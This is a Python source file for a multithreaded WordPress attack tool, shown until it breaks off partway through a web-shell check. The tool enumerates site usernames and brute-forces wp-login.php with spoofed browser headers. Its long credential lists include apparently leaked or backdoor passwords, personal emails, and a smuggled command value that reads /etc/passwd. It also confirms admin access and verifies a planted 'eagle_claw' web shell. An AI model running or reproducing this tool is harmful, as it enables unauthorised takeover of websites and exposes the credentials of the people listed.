#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init
from requests.exceptions import RequestException, ConnectionError, Timeout
import os
import socket
import time
import string
import random
from urllib.parse import urlparse, urljoin
import urllib3

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

fr = Fore.RED
fg = Fore.GREEN

class UltimateWPChecker:
    def __init__(self, threads=30, output_dir="./resultBunk"):
        self.threads = threads
        self.output_dir = output_dir
        self.timeout = 10
        self.max_retries = 3
        
        # Colors
        self.fr = Fore.RED
        self.fg = Fore.GREEN
        self.fw = Fore.WHITE
        self.fc = Fore.CYAN
        self.fy = Fore.YELLOW
        
        # Statistics
        self.stats = {
            'total': 0,
            'wordpress': 0,
            'usernames_found': 0,
            'successful': 0,
            'failed': 0,
            'shells': 0
        }
        
        # Create Files directory if not exists
        if not os.path.exists("Files"):
            os.makedirs("Files")
            
        # Create output directory if not exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def get_random_headers(self):
        chrome_versions = ['90.0.4430.212', '91.0.4472.124', '92.0.4515.131', '93.0.4577.63', '94.0.4606.71']
        firefox_versions = ['89.0.2', '90.0.1', '91.0', '92.0', '93.0']
        safari_versions = ['14.0.3', '14.1', '14.1.1', '14.1.2', '15.0']
        
        os_strings = [
            'Windows NT 10.0; Win64; x64',
            'Macintosh; Intel Mac OS X 10_15_7',
            'X11; Linux x86_64',
            'Windows NT 6.1; Win64; x64'
        ]
        
        browser_choice = random.randint(1, 10)
        if browser_choice <= 5:
            version = random.choice(chrome_versions)
            os_string = random.choice(os_strings)
            user_agent = 'Mozilla/5.0 (' + os_string + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + version + ' Safari/537.36'
        elif browser_choice <= 7:
            version = random.choice(firefox_versions)
            os_string = random.choice(os_strings[:4])
            user_agent = 'Mozilla/5.0 (' + os_string + '; rv:' + version.split('.')[0] + '.0) Gecko/20100101 Firefox/' + version
        else:
            version = random.choice(safari_versions)
            os_string = random.choice(os_strings[:2])
            user_agent = 'Mozilla/5.0 (' + os_string + ') AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' + version + ' Safari/605.1.15'
            
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        return headers
    
    def normalize_url(self, url):
        # Ensure URL has a proper scheme
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Parse URL
        parsed = urlparse(url)
        
        # Reconstruct URL with normalized components
        normalized = parsed.scheme + '://' + parsed.netloc
        
        return normalized
    
    def extract_domain(self, url):
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower().replace('www.', '')
            return domain
        except:
            return None
    
    def random_string(self, length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    def content_from_response(self, response):
        try:
            return response.text
        except:
            try:
                return response.content.decode('utf-8', errors='ignore')
            except:
                return str(response.content)
    
    def extract_usernames(self, url, session):
        found_usernames = []
        
        # Method 1: Author ID Enumeration (most reliable)
        try:
            for author_id in range(1, 6):  # Limit to 5 attempts
                author_url = url + '/?author=' + str(author_id)
                resp = session.get(author_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False, allow_redirects=True)
                if resp.status_code == 200:
                    final_url = resp.url
                    patterns = [
                        r'/author/([^/]+)/',
                        r'/author/([^/]+)$',
                        r'author=([^&]+)'
                    ]
                    for pattern in patterns:
                        match = re.search(pattern, final_url)
                        if match:
                            username = match.group(1)
                            if username and username not in found_usernames:
                                found_usernames.append(username)
                                print(' -| ' + url + ' --> ' + self.fg + '[Author Username: ' + username + ']')
                                if len(found_usernames) >= 5:  # Limit to 5 usernames
                                    break
                    if len(found_usernames) >= 5:
                        break
        except:
            pass
        
        # Method 2: REST API Users Endpoint (second most reliable)
        try:
            if len(found_usernames) < 5:  # Only try if we haven't reached 5 usernames yet
                api_url = url + '/wp-json/wp/v2/users'
                resp = session.get(api_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False)
                if resp.status_code == 200:
                    try:
                        users = resp.json()
                        for user in users:  # No limit here, we'll break at 5 total
                            if 'slug' in user:
                                username = user['slug']
                                if username and username not in found_usernames:
                                    found_usernames.append(username)
                                    print(' -| ' + url + ' --> ' + self.fg + '[API Username: ' + username + ']')
                                    if len(found_usernames) >= 5:  # Limit to 5 usernames
                                        break
                            if len(found_usernames) >= 5:
                                break
                    except:
                        pass
        except:
            pass
            
        return found_usernames
    
    def is_wordpress(self, url, session):
        # Ultra-Comprehensive WordPress Detection with Multiple Methods
        
        # Method 1: Check wp-login.php (most reliable)
        try:
            login_url = url + '/wp-login.php'
            resp = session.get(login_url, headers=self.get_random_headers(),
                              timeout=self.timeout, verify=False, allow_redirects=True)
            if resp.status_code == 200:
                content = resp.text.lower()
                # Check for multiple WordPress login indicators
                wp_login_indicators = [
                    'wp-submit', 'wordpress', 'wp-login.php', 'user_login',
                    'user_pass', 'rememberme', 'wp-login-logo', 'loginform',
                    'id="loginform"', 'name="log"', 'name="pwd"', 'name="rememberme"',
                    'class="login"', 'id="user_login"', 'id="user_pass"',
                    'value="log in"', 'value="login"', 'action=login',
                    'lostpassword', 'backtoblog', 'wp_attempt_focus'
                ]
                found_indicators = sum(1 for indicator in wp_login_indicators if indicator in content)
                if found_indicators >= 2:  # Need at least 2 indicators
                    return True, login_url
        except:
            pass
        
        # Method 2: Check wp-admin directory
        try:
            admin_url = url + '/wp-admin/'
            resp = session.get(admin_url, headers=self.get_random_headers(),
                              timeout=self.timeout, verify=False, allow_redirects=True)
            if resp.status_code in [200, 301, 302, 307]:
                content = resp.text.lower()
                wp_admin_indicators = [
                    'wp-admin', 'wordpress', 'dashboard', 'wp-admin.css',
                    'wp-load.php', 'admin.php', 'admin-ajax.php',
                    'class="wp-admin"', 'id="wpadminbar"', 'wp-admin-bar',
                    'wp-admin-bar-site-name', 'wp-admin-bar-updates',
                    'wp-admin-bar-comments', 'wp-admin-bar-new-content'
                ]
                found_indicators = sum(1 for indicator in wp_admin_indicators if indicator in content)
                if found_indicators >= 2:
                    return True, url + '/wp-login.php'
        except:
            pass
        
        # Method 3: Check homepage for WordPress indicators (comprehensive)
        try:
            resp = session.get(url, headers=self.get_random_headers(),
                              timeout=self.timeout, verify=False, allow_redirects=True)
            if resp.status_code == 200:
                content = resp.text.lower()
                
                # Check for WordPress meta generator (very reliable)
                if re.search(r'meta\s+name\s*=\s*["\']generator["\']\s+content\s*=\s*["\']wordpress', content):
                    return True, url + '/wp-login.php'
                
                # Check for WordPress CSS/JS includes
                wp_includes = [
                    'wp-content/', 'wp-includes/', 'wp-json/', 'xmlrpc.php',
                    'wp-cron.php', 'wp-config.php', 'wp-load.php',
                    'wp-admin/', 'wp-login.php', 'wp-signup.php',
                    'wp-activate.php', 'wp-trackback.php', 'wp-comments-post.php',
                    'wp-blog-header.php', 'wp-config-sample.php', 'wp-links-opml.php'
                ]
                
                found_includes = sum(1 for include in wp_includes if include in content)
                if found_includes >= 2:
                    return True, url + '/wp-login.php'
                
                # Check for WordPress specific CSS classes and IDs
                wp_classes_ids = [
                    'wp-admin-bar', 'wp-toolbar', 'wp-customize',
                    'wp-embed', 'wp-block-library', 'wp-json-link',
                    'wp-api-link', 'wp-oembed', 'wp-shortlink',
                    'class="post-', 'class="entry-', 'class="comment-',
                    'id="post-', 'id="comment-', 'class="widget-',
                    'class="menu-', 'class="nav-', 'wp-post-image',
                    'attachment-', 'category-', 'tag-'
                ]
                
                found_classes = sum(1 for cls in wp_classes_ids if cls in content)
                if found_classes >= 3:
                    return True, url + '/wp-login.php'
                
                # Check for WordPress specific HTML structures
                wp_structures = [
                    '<!-- wordpress', '<!-- /wordpress', 'generator="wordpress',
                    'powered by wordpress', 'site by wordpress', 'wordpress theme',
                    'wordpress plugin', 'wp_footer()', 'wp_head()',
                    'body_class(', 'post_class(', 'comment_class(',
                    'get_header(', 'get_footer(', 'get_sidebar(',
                    'the_content(', 'the_title(', 'the_excerpt('
                ]
                
                found_structures = sum(1 for struct in wp_structures if struct in content)
                if found_structures >= 1:
                    return True, url + '/wp-login.php'
                
                # Check for WordPress REST API
                if 'wp-json' in content or 'rest_route' in content:
                    return True, url + '/wp-login.php'
                
                # Check for WordPress feeds
                wp_feeds = [
                    'feed=rss2', 'feed=rss', 'feed=atom',
                    '/feed/', '/comments/feed/', '/wp-json/wp/v2/',
                    '?feed=', '?feed=rss2', '?feed=rss'
                ]
                
                found_feeds = sum(1 for feed in wp_feeds if feed in content)
                if found_feeds >= 1:
                    return True, url + '/wp-login.php'
        except:
            pass
        
        # Method 4: Check common WordPress files (comprehensive)
        wp_files = [
            '/wp-admin/admin-ajax.php',
            '/wp-admin/load-scripts.php',
            '/wp-admin/load-styles.php',
            '/wp-includes/js/jquery/jquery.js',
            '/wp-includes/css/dashicons.css',
            '/wp-content/themes/',
            '/wp-content/plugins/',
            '/wp-includes/version.php',
            '/wp-includes/functions.php',
            '/wp-includes/class-wp.php',
            '/wp-includes/option.php',
            '/wp-includes/post.php',
            '/wp-includes/user.php'
        ]
        
        for file_path in wp_files:
            try:
                file_url = url + file_path
                resp = session.get(file_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False)
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if 'wordpress' in content or 'wp-' in content:
                        return True, url + '/wp-login.php'
            except:
                continue
        
        # Method 5: Check WordPress REST API endpoints (comprehensive)
        api_endpoints = [
            '/wp-json/',
            '/wp-json/wp/v2/',
            '/wp-json/oembed/1.0/embed',
            '/?rest_route=/',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/wp/v2/media',
            '/wp-json/wp/v2/categories',
            '/wp-json/wp/v2/tags'
        ]
        
        for endpoint in api_endpoints:
            try:
                api_url = url + endpoint
                resp = session.get(api_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False)
                if resp.status_code == 200:
                    try:
                        json_data = resp.json()
                        if 'name' in json_data or 'description' in json_data or 'namespace' in json_data:
                            return True, url + '/wp-login.php'
                    except:
                        # If not JSON, check for WordPress indicators in content
                        content = resp.text.lower()
                        if 'wordpress' in content or 'wp-' in content:
                            return True, url + '/wp-login.php'
            except:
                continue
        
        # Method 6: Check for WordPress in headers
        try:
            resp = session.get(url, headers=self.get_random_headers(),
                              timeout=5, verify=False, allow_redirects=False)
            headers = resp.headers
            
            # Check for WordPress in various headers
            for header_name, header_value in headers.items():
                if 'wordpress' in header_value.lower() or 'wp-' in header_value.lower():
                    return True, url + '/wp-login.php'
                    
            # Check for WordPress cookies
            if 'set-cookie' in headers:
                cookies = headers['set-cookie']
                if 'wordpress' in cookies.lower() or 'wp-' in cookies.lower():
                    return True, url + '/wp-login.php'
        except:
            pass
        
        # Method 7: Check WordPress specific paths
        wp_paths = [
            '/wp-content/uploads/',
            '/wp-content/themes/twentytwenty/',
            '/wp-content/themes/twentytwentyone/',
            '/wp-content/themes/twentytwentytwo/',
            '/wp-content/themes/twentytwentythree/',
            '/wp-content/plugins/hello.php',
            '/wp-content/plugins/akismet/',
            '/wp-includes/images/w-logo-blue.png'
        ]
        
        for path in wp_paths:
            try:
                path_url = url + path
                resp = session.get(path_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False)
                if resp.status_code in [200, 301, 302, 307]:
                    return True, url + '/wp-login.php'
            except:
                continue
        
        # Method 8: Check for WordPress in robots.txt
        try:
            robots_url = url + '/robots.txt'
            resp = session.get(robots_url, headers=self.get_random_headers(),
                              timeout=5, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                wp_robots_indicators = [
                    'wp-admin', 'wp-includes', 'wp-content',
                    'wp-login.php', 'wp-signup.php', 'wp-activate.php'
                ]
                found_indicators = sum(1 for indicator in wp_robots_indicators if indicator in content)
                if found_indicators >= 1:
                    return True, url + '/wp-login.php'
        except:
            pass
        
        # Method 9: Check for WordPress in sitemap.xml
        try:
            sitemap_url = url + '/sitemap.xml'
            resp = session.get(sitemap_url, headers=self.get_random_headers(),
                              timeout=5, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                if 'wp-content' in content or 'wp-' in content:
                    return True, url + '/wp-login.php'
        except:
            pass
        
        # Method 10: Check for WordPress in RSS feeds
        try:
            rss_urls = [
                url + '/feed/',
                url + '/feed/rss/',
                url + '/feed/rss2/',
                url + '/feed/atom/',
                url + '/?feed=rss2',
                url + '/?feed=rss',
                url + '/?feed=atom'
            ]
            
            for rss_url in rss_urls:
                resp = session.get(rss_url, headers=self.get_random_headers(),
                                  timeout=5, verify=False)
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if 'wordpress' in content or 'wp-content' in content:
                        return True, url + '/wp-login.php'
        except:
            pass
        
        return False, None
    
    def generate_common_admin_credentials(self):
        # Common admin credentials - highest priority
        admin_creds = [
            ("root", "r007p455w0rd"),
            ("root", "!r007p455w0rd!"),
            ("user", "g4a5J8fWeSfRvNMT"),
            ("admin", "https://log.topsites.cc"),
            ("xtw183873cec", "DH!bYsRn6573$3uk"),
            ("xtw18387f816", "DH!bYsRn6573$3uk"),
            ("admin", "admin@https://log.topsites.cc"),
            ("wpapitest", "wpapitest123x"),
            ("root", "Zb{O@U{vsFjq&#j(<?L[IyOHi_#9]i-L1JNO=Ec"),
            ("johnelouter", "$KH3WSERDfe4yfsfg$"),
            ("johnelouter@hotmail.com", "$KH3WSERDfe4yfsfg$"),
            ("matigan", "caseyq45"),
            ("ad_ddddin", "xsacreed@"),
            ("yanz@123457", "yanz@123457"),
            ("Lara", "Jane392216"),
            ("Lara", "admin@https://log.topsites.cc"),
            ('admin', ' https://log.topsites.cc'),
            ("wordpress administrator", "wordpress_administrator"),
            ("admin@wordpress.com", "r007p455w0rd"),
            ("wordpressauto", "wordpressbl2025"),
            ("admin@wordpress.com", "fZgfj64ffs!32gggfAS"),
            ("wpadminns", "OpF^MJrUK$UVYrfG"),
            ("admin@wordpress.com", "Zb{0@U{vsFjq&amp;#j(&lt;?L[Iy0Hi_#9]i-LlJN0=Ec"),
            ("wp_rest_api", "Pm9xYbOqeDezqwx2D3lu"),
            ("sbd-admin", "Sbd-admin2021@@"),
            ("admin@wordpress.com", "r007pd8skdgSejrd"),
            ("root", "rastap455w0rd"),
            ("Administrarot", "63a9f0ea7"),
            ("wpcode", "ahxPSDxkOOuc"),
            ("root", "Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-L1JN0=Ec"),
            ("administrator1@wordpress.com", "rastap455w0rd"),
            ("honzik.pokorny@centrum.cz", "kralicinka1"),
            ("admin_user", "ZFsaPCns"),
            ("GuaUserWa3", "Arqfosg1@1s2.3@"),
            ("wpsupport", "r007pas5w0rd"),
            ("johnelouter", "Kh3wserdfe4yfsfg"),
            ("etomidetka", "StrongPassword13!@"),
            ("administrator1@wordpress.com", "63a9f0ea7"),
            ("keptsecret", "keptsecret123"),
            ("admin:h4:login", "admin:h4:password:2250++"),
            ("Beary", "IronWay9!#"),
            ("admin", "g4a5J8fWeSfRvNMT"),
            ("custom", "info@123password@123"),
            ("gyaltshen", "gyaltshen"),
            ("metsys", "9ef4e771f297b84303e192c658fae145"),
            ("admin", "P@ssw0rd"),
            ("User", "$ri$htiR@j@t@2019"),
            ("excontrol", "30$y&IvD3@W1Sq9t"),
            ("bapaksaya", "kagetbukankepala"),
            ("backupsystems", "@KPEOr1dfghh54gh5fg@"),
            ("ACH", "ObTJGpWvVx3G8WKk"),
            ("wadminw", "0192837465z"),
            ("wp-system", "8d764e81eecb7546a8336b993d687431"),
            ("webuser", "azLU0o0GmtOy"),
            ("websitesupport@getpagehub.com", "R0wdyroDDyP1p3r24!"),
            ("metalmaxrs", "e8p6b4b2a4f2"),
            ("isbs", "5eBC68F6FF"),
            ("adminkelp", "creatin2500"),
            ("web@fingersduke.com", "HI4k36eig…W"),
            ("EricHockly", "Sureweb006"),
            ("support_access", "support_accessA3#!"),
            ("wwwadmin", "0192837465"),
            ("root", "Jane392216"),
            ("root", "!r007p455w0rd!"),
            ("admin", "dG3WW2G@3"),
            ("charlesmichel234@gmail.com", "Sbservice@47?"),
            ("Carezaike", "Enjf!p1t23GJ"),
            ("mr_admin", "pa55w0rd!"),
            ("administrator1@wordpress.com", "r007p455w0rd"),
            ("administrator1@wordpress.com", "r007p4S5w0rd"),
            ("administrator1@wordpress.com", "!r007p455w0rd!"),
            ("administrator1@wordpress.com", "r007p455w0rd__"),
            ("admin@wordpress.com", "r007p4S5w0rd"),
            ("admin@wordpress.com", "!r007p455w0rd!"),
            ("admin@wordpress.com", "r007pas5w0rd"),
            ("admin@wordpress.com", "63a9f0ea7"),
            ("admin@wordpress.com", "Zb{0@U{vsFjq"),
            ("admin", "Admin@2025"),
            ("admin@wordpress.com", "63a9f0ea7bb98050796b649e85481845"),
            ('admin', 'admin'),
            ('admin', 'admin!!!'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('admin', '12345678'),
            ('admin', 'qwerty'),
            ('admin', '111111'),
            ('admin', '123123'),
            ('admin', 'adminadmin'),
            ('admin', 'password1'),
            ('admin', '1234'),
            ('admin', 'admin@123'),
            ('admin', 'admin123!'),
            ('admin', 'admin2023'),
            ('admin', 'admin2024'),
            ('administrator', 'administrator'),
            ('administrator', 'password'),
            ('administrator', '123456'),
            ('administrator', 'admin123'),
            ('administrator', '12345678'),
            ('demo', 'demo'),
            ('test', 'test'),
            ('wpadmin', 'wpadmin'),
            ('wordpress', 'wordpress'),
            ("lara@larawilsonmusic.com", "WDAhq6kp2@@"),
            ("Lara", "7xTp4Lw"),
            ("admin", "addmiwn1@d1aA2Akd3"),
            ("admin", "log@123"),
            ("admin", "blah"),
            ("admin", "Admin@123"),
            ("admin", "admin.123"),
            ("admin", "Admin2023"),
            ("wertuslash", "fZgfj64ffs!32gggfAS"),
            ("admin", "admin#123"),
            ("admin", "Log@123"),
            ("admin", "adminwordpress"),
            ("admin", "admin@123!"),
            ("admin", "admin2025@"),
            ("admin", "adminadmin123"),
            ("admin", "Admin@321"),
            ("admin", "Admin@"),
            ("admin", "log2025@@"),
            ("admin", "admin@321"),
            ("admin", "Admin"),
            ("admin", "admin12345!"),
            ("admin", "admin@"),
            ("admin", "admin@gmail.com"),
            ("admin", "log1999"),
            ("admin", "admin123@"),
            ("admin", "Log1!"),
            ("admin", "Admin123@"),
            ("admin", "admin123456"),
            ("admin", "admin@12346"),
            ("admin", "admin@111"),
            ("admin", "user%02"),
            ("admin", "topsites123"),
            ("admin", "Admin123"),
            ("admin", "admin123!@#"),
            ("admin", "topsites2022"),
            ("admin", "admin@12345"),
            ("admin", "admin123[login]"),
            ("admin", "info@topsites.com"),
            ("admin", "1topsites34567890"),
            ("admin", "p@ssw0rd"),
            ("admin", "1qaz@WSX"),
            ("admin", "w0rdpr3ss"),
            ("admin", "@123"),
            ("admin", "Admin1"),
            ("admin", "Admin0101"),
            ("admin", "Admin007"),
            ("admin", "Admin!@#$%"),
            ("admin", "Admin!!!!"),
            ("admin", "log1111"),
            ("admin", "log11"),
            ("admin", "log!"),
            ("admin", "Qwerty12345"),
            ("admin", "Qwerty12"),
            ("admin", "QWErty123"),
            ("admin", "QSDFGH"),
            ("admin", "FGĞIOD"),
            ("admin", "Administrator1"),
            ("admin", "@dm1n"),
            ("admin", "3rjs1la7qe"),
            ("admin", "1q2w3e4r5t6y"),
            ("admin", "1q2w3e4r"),
            ("admin", "1a2b3c4d"),
            ("admin", "159753"),
            ("admin", "12qw34er"),
            ("admin", "123qweasd"),
            ("admin", "123qwe123"),
            ("admin", "123mudar"),
            ("admin", "1234qwer"),
            ("admin", "123456a"),
            ("admin", "12345670"),
            ("admin", "123456!@#"),
            ("admin", "123450"),
            ("admin", "12344321"),
            ("admin", "123123123"),
            ("admin", "123!@#"),
            ("admin", "121212"),
            ("admin", "1122334455"),
            ("admin", "111111q"),
            ("admin", "111111111111"),
            ("admin", "10203040"),
            ("admin", "101010"),
            ("admin", "090909"),
            ("admin", "02071976"),
            ("admin", "000000"),
            ("admin", "!QAZxsw2"),
            ("admin", "!@#admin"),
            ("admin", "!@#$%^"),
            ("admin", "ŪGJRMV"),
            ("admin", "ĄŽERTY"),
            ("log", "log@1"),
            ("admin", "Admin123!@#"),
            ("admin", "admin100"),
            ("Log123@", ""),
            ("Sender", "SENDER"),
            ("admin", "THEN"),
            ("admin", "!!!!!!")
        ]
        
        # Remove duplicates while preserving order
        seen = set()
        unique_creds = []
        for cred in admin_creds:
            if cred not in seen:
                seen.add(cred)
                unique_creds.append(cred)
                
        return unique_creds
    
    def generate_extended_credentials(self, found_usernames, domain):
        # Simplified credential generation for speed
        
        # Enhanced common passwords list - ordered by effectiveness
        common_passwords = [
            # Top most common passwords
            'password', '123456', 'password123', '12345678', 'admin', '123456789', 
            'qwerty', '1234567', '1234567890', 'admin123', 'welcome', '123123',
            'admin@123', 'letmein', 'password1', '1234', 'qwerty123', 'adminadmin',
            "r007p455w0rd",
            "wpapitest123x",
            "Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-L1JN0=Ec",
            "Kh3wserdfe4yfsfg",
            "caseyq45",
            "xsacreed@",
            "yanz@123457",
            "wordpress_administrator",
            "wordpressbl2025",
            "fZgfj64ffs!32gggfAS",
            "OpF^MJrUK$UVYrfG",
            "Pm9xYbOqeDezqwx2D3Iu",
            "Sbd-admin2021@@",
            "r007pd8skdgSejrd",
            "rastap455w0rd",
            "63a9f0ea7",
            "ahxPSDxkOOuc",
            "$ri$htiR@j@t@2019",
            "gaeposup",
            "kralicinka1",
            "ZFsaPCns",
            "Arqfosg1@1s2.3@",
            "r007pas5w0rd",
            "graphic-bank",
            "StrongPassword13!@",
            "keptsecret",
            "futabasangyou",
            "g4a5J8fWeSfRvNMT",
            "info@123password@123",
            "ks3yj8bk7t",
            "9ef4e771f297b84303e192c658fae145",
            "P@ssw0rd",
            "30$y&IvD3@W1Sq9t",
            "lutiva123",
            "jsoi-kh",
            "ObTJGpWvVx3G8WKk",
            "0192837465z",
            "Bot@123456",
            "keptsecret123",
            "admin",
            "password",
            "123456",
            "admin123",
            "12345678",
            "qwerty",
            "111111",
            "123123",
            "adminadmin",
            "letmein",
            "welcome",
            "password1",
            "1234",
            "admin@123",
            "admin123!",
            "admin2023",
            "admin2024",
            "administrator",
            "demo",
            "test",
            "wpadmin",
            "wordpress",
            "Jane392216",
            "r007p455w0rd__",
            "r007p4S5w0rd",
            "!r007p455w0rd!",
            "12345",
            "yes",
            "Zb{0@U{vsFjq",
            "0192837465",
            "Wizywise1#",
            "en_CA",
            "53vtL36Xon",
            "6.0.1",
            "pass",
            "Pa55W0rd@",
            "R0wdyroDDyP1p3r24!",
            "Sbservice@47?",
            "5eBC68F6FF",
            "Enjf!p1t23GJ",
            "HI4k36eig…W",
            "blah",
            "changeme",
            "coffee789$$",
            "developer12345",
            "e8p6b4b2a4f2",
            "pa55w0rd!",
            "serfw234@23yje(832)",
            "test123",
            "123",
            "123456789",
            "Who1oxpjbze1Knows",
            "azLU0o0GmtOy",
            "everynation2018!",
            "n{@8H~5N4tKbxm[Q",
            "rouptin^MJrUK$SzYcOrffGG",
            "{compromised}",
            "174.91.15.142",
            "Rush",
            "Sureweb006",
            "admin1234",
            "admin12345",
            "akHb0VIpn2CD",
            "creatin2500",
            "logitech89",
            "wpcf7-f32-p33-o1",
            "(VEwphZAiLqeIjZ*17**top",
            "76R",
            "Admin123",
            "Admin@123",
            "M@r�[2014",
            "admin1",
            "pfgfcyjqd[jl",
            "support_accessA3#!",
            "wpcf7-f270-p268-o1",
            "10pace",
            "M@r%!c0[2014",
            "0adejk",
            "25t98k",
            "19y578",
            "wpcf7-f1075-p1072-o1",
            "/home/user/file.jpg",
            "'|cat /etc/passwd||'"
        ]
        
        # Initialize credentials list
        creds = []
        
        # 1. Add domain-based credentials
        if domain:
            # Domain name as username
            creds.append((domain, domain))
            creds.append((domain, domain + '123'))
            creds.append((domain, domain + '@123'))
            creds.append((domain, domain + '2023'))
            creds.append((domain, domain + '!'))
            
            # Domain parts as username
            domain_parts = domain.split('.')
            if len(domain_parts) > 1:
                main_domain = domain_parts[0]
                creds.append((main_domain, main_domain))
                creds.append((main_domain, main_domain + '123'))
                creds.append((main_domain, main_domain + '@123'))
                creds.append((main_domain, main_domain + '2023'))
                creds.append((main_domain, main_domain + '!'))
        
        # 2. Add username-based credentials if usernames were found
        if found_usernames:
            for username in found_usernames:  # Use all found usernames (max 10)
                # Username as password
                creds.append((username, username))
                
                # Username + common variations
                creds.append((username, username + '123'))
                creds.append((username, username + '@123'))
                creds.append((username, username + '2023'))
                creds.append((username, username + '!'))
                creds.append((username, username + '123!'))
                creds.append((username, username + '@123'))
                
                # Common passwords with this username
                for password in common_passwords[:5]:  # Try top 5 common passwords
                    creds.append((username, password))
        
        # 3. Add common credentials with common passwords
        for username in ['admin', 'administrator', 'root', 'user']:
            for password in common_passwords[:10]:  # Try top 10 common passwords
                creds.append((username, password))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_creds = []
        for cred in creds:
            if cred not in seen:
                seen.add(cred)
                unique_creds.append(cred)
                
        return unique_creds
    
    def verify_real_admin_access(self, session, url, headers):
        try:
            # Simplified admin verification for speed
            test_url = url + '/wp-admin/index.php'
            resp = session.get(test_url, headers=headers,
                              timeout=5, verify=False, allow_redirects=True)
            if resp.status_code == 200:
                if 'wp-login.php' in resp.url:
                    return False, None
                    
                content = resp.text
                admin_indicators = [
                    "<div id=\"wpwrap\">",
                    "<div id=\"wpcontent\">",
                    "<div id=\"wpbody\"",
                    "id=\"adminmenu\"",
                    "id=\"adminmenuwrap\"",
                    "class=\"wp-admin",
                    "wp-admin-bar",
                    "wp-admin.css"
                ]
                
                found = sum(1 for ind in admin_indicators if ind in content)
                if found >= 2:  # Reduced threshold for speed
                    return True, content
                    
            return False, None
        except:
            return False, None
    
    def simple_login_check(self, session, url, username, password, login_url):
        try:
            headers = self.get_random_headers()
            headers['Referer'] = login_url
            
            login_data = {
                'log': username,
                'pwd': password,
                'redirect_to': url + '/wp-admin/',
                'testcookie': '1'
            }
            
            login_headers = self.get_random_headers()
            login_headers['Referer'] = login_url
            
            login_resp = session.post(login_url, data=login_data, headers=login_headers,
                                     timeout=self.timeout, verify=False, allow_redirects=False)
            
            if login_resp.status_code in [301, 302, 303, 307]:
                location = login_resp.headers.get('Location', '')
                if 'wp-admin' in location and 'wp-login.php' not in location:
                    is_real_admin, admin_content = self.verify_real_admin_access(session, url, headers)
                    if is_real_admin:
                        return True, admin_content
            
            # Check for authentication cookies
            is_real_admin, admin_content = self.verify_real_admin_access(session, url, headers)
            if is_real_admin:
                return True, admin_content
                
            has_auth_cookie = False
            for cookie in session.cookies:
                if 'wordpress' in cookie.name.lower():
                    has_auth_cookie = True
                    break
                    
            if has_auth_cookie:
                is_real_admin, admin_content = self.verify_real_admin_access(session, url, headers)
                if is_real_admin:
                    return True, admin_content
                    
            return False, None
        except Exception as e:
            return False, None
    
    def extract_nonce(self, content, field_name='_wpnonce'):
        # Comprehensive nonce extraction patterns
        patterns = [
            # Standard HTML input
            rf'<input[^>]*name=["\']{field_name}["\'][^>]*value=["\'](.*?)["\']',
            rf'<input[^>]*value=["\'](.*?)["\'][^>]*name=["\']{field_name}["\']',
            
            # Hidden input with type
            rf'<input[^>]*type=["\']hidden["\'][^>]*name=["\']{field_name}["\'][^>]*value=["\'](.*?)["\']',
            
            # JSON format
            rf'"{field_name}":"(.*?)"',
            rf'{field_name}":"(.*?)"',
            
            # JavaScript variables
            rf'var\s+{field_name}\s*=\s*["\'](.*?)["\']',
            rf'{field_name}\s*=\s*["\'](.*?)["\']',
            
            # Form data
            rf'name=["\']{field_name}["\'][^>]*value=["\'](.*?)["\']',
            rf'value=["\'](.*?)["\'][^>]*name=["\']{field_name}["\']',
            
            # WordPress specific
            rf'_wpnonce["\']?\s*[:=]\s*["\'](.*?)["\']',
            rf'wp_nonce["\']?\s*[:=]\s*["\'](.*?)["\']',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                return matches[0]
        
        return None
    
    def collect_all_nonces(self, content):
        nonces = {}
        
        # Collect all types of nonces
        nonce_fields = [
            '_wpnonce', 'wp_nonce', 'nonce', '_wpnonce_referer',
            '_wp_http_referer', 'security', 'ajax_nonce'
        ]
        
        for field in nonce_fields:
            nonce = self.extract_nonce(content, field)
            if nonce:
                nonces[field] = nonce
        
        return nonces
    
    def verify_shell(self, shell_url):
        """Enhanced shell verification for EAGLE_CLAW shell"""
        try:
            resp = requests.get(shell_url, timeout=10, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                
                # Check for multiple EAGLE_CLAW shell identifiers
                shell_indicators = [
                    'byte_bunk shell',  # Title of the shell
                    'advanced bypassable web shell',  # Subtitle
                    'author: eagle_claw',  # Author info
                    'telegram: @eagle0799',  # Contact info
                    'file manager',  # Tab name
                    'terminal',  # Tab name
                    'system info',  # Tab name
                    'database',  # Tab name
                    'network',  # Tab name
                    'bypass',  # Tab name
                    'resolvepath',  # Function name in the shell
                    'executecommand',  # Function name in the shell
                    'getsysteminfo',  # Function name in the shell
                    '🦅 eagle_claw',  # Icon and name in header
                    'eagle0799',  # Telegram handle
                    'bypassable web shell',  # Part of the title
                    'bypass security restrictions',  # Comment in code
                    'alternative function mapping',  # Comment in code
